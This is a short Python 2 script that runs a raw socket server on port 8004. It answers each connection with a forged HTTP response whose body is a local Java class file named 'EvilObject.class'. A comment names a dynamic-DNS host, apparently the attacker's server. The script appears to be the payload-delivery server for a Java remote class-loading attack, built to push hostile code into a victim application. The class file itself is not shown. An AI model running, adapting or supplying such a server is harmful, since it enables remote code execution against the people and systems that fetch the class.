from itertools import izip, cycle
import socket
import threading
global sockets
from random import choice
from string import ascii_uppercase
import time
import select
sockets = []
def fileread():
    fh=open("EvilObject.class", "rb")
    data=fh.read()
    fh.close()
    return data

def recvTimeout(sock, size, timeout=2):
    sock.setblocking(0)
    ready = select.select([sock], [], [], timeout)
    if ready[0]:
        data = sock.recv(size)
        return data
    return ""
def clientHandler(c, addr):
    try:
        global sockets
        print addr[0] + ":" + str(addr[1]) + " has connected!"
        data = recvTimeout(c,1024)
        c.send("""HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.5.2
Date: Tue, 24 Nov 2020 01:43:28 GMT
Content-type: application/java-vm
Content-Length: """ + str(len(fileread())) + """
Last-Modified: Tue, 24 Nov 2020 01:36:24 GMT

""" + fileread())
        c.close()
    except:
        pass

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('', 8004))
s.listen(999999999) #c541f5d439a359.ddns.net
#threading.Thread(target=broadcastPING, args=()).start()
while 1:
    try:
        c, addr = s.accept()
        threading.Thread(target=clientHandler, args=(c, addr,)).start()
    except:
        pass
